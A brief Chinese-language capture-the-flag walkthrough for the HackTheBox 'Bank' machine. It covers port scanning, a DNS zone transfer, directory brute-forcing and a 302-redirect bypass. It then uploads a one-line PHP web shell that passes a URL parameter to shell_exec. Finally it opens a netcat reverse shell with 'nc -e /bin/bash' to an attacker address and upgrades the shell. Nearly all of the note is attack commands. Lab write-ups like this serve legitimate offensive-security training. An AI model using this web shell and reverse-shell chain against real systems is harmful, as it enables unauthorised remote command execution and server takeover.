
# Bank

* 扫端口
``` 
nmap -p- -oA full-port 10.10.10.29 
nmap -p22,53,80 -sV -A -oA targeted-script 10.10.10.29 
```
* dns 
``` 
dig axfr @10.10.10.29 bank.htb
dig @10.10.10.29 bank.htb

nslookup
> server 10.10.10.29 
```

* 扫描
``` 
gobuster -t 50 -w /usr/sharewordlist/dirbuster/directory.txt -u http://bank.htb -f -x php 
```

* 访问页面时候发现302跳转，阻止302跳转，得到隐藏页面
* 上传一句话文件
``` 
<?php echo shell_exec($_GET['e'].'2>&1');?>
cp shell.txt shell.htb 
```
* 执行
``` 
nc -nvlp 9000
?e=nc -e /bin/bash 10.10.14.16 9000

python -c "import pty; pty.spawn('/bin/bash')" 
```

